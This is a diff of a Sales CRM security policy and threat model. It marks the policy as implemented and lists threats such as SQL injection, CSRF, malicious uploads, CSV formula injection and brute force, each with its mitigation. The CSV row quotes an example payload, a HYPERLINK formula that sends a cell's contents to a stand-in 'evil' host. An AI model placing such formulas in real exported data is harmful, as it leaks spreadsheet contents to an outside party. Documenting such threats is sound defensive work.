@@ -1,8 +1,8 @@
 # Security Policy & Threat Model — Sales CRM
 
-**Last Updated:** 2026-11-17  
-**Implementation Status:** `Proposed (Greenfield Security Baseline)`  
-**Related Docs:** `GEMINI.md`, `docs/security/authentication.md`, `docs/security/authorization.md`, `docs/security/security-checklist.md`
+**Last Updated:** 2026-11-19  
+**Implementation Status:** `Implemented (Active Security Standard)`  
+**Related Docs:** `docs/security/authentication.md`, `docs/security/authorization.md`, `docs/security/security-checklist.md`
 
 ## 1. Security Posture Overview
 
@@ -18,10 +18,11 @@
 | **SQL Injection (SQLi)** | Crafted filter/sort query parameter in reports or search | Parameterized Eloquent bindings + strict column whitelist (`Rule::in([...])`) on dynamic `orderBy` | `docs/security/input-validation.md` |
 | **Cross-Site Request Forgery (CSRF)** | Forged POST request changing deal stage or exporting contacts | `ValidateCsrfToken` middleware + `@csrf` in forms + `X-CSRF-TOKEN` in Vanilla JS `fetch` | `docs/security/authentication.md` |
 | **Malicious File Upload / RCE** | Uploading `.php` or `.svg` script disguised as quotation attachment | Strict server-side MIME + extension validation, randomized storage filenames on non-public `private` disk | `docs/security/file-upload-security.md` |
-| **CSV Formula Injection** | Uploading lead name `=HYPERLINK("http://evil/leak",A1)` | Prefix leading `=`, `+`, `-`, `@`, `	`, `` characters with `'` during CSV export/import | `docs/modules/import-and-export.md` |
+| **CSV Formula Injection** | Uploading lead name `=HYPERLINK("http://evil/leak",A1)` | Prefix leading `=`, `+`, `-`, `@`, `	`, `
+` characters with `'` during CSV export/import | `docs/modules/import-and-export.md` |
 | **Credential Stuffing / Brute Force** | Automated login attempts against sales rep accounts | `RateLimiter` throttling (5 attempts/minute per email+IP), Argon2id/Bcrypt hashing, audit logging | `docs/security/authentication.md` |
 
-## 3. Mandatory HTTP Security Headers (`SecurityHeadersMiddleware`) (`Proposed`)
+## 3. Mandatory HTTP Security Headers (`SecurityHeadersMiddleware`)
 
 Every HTTP response must include:
 - `X-Frame-Options: DENY`
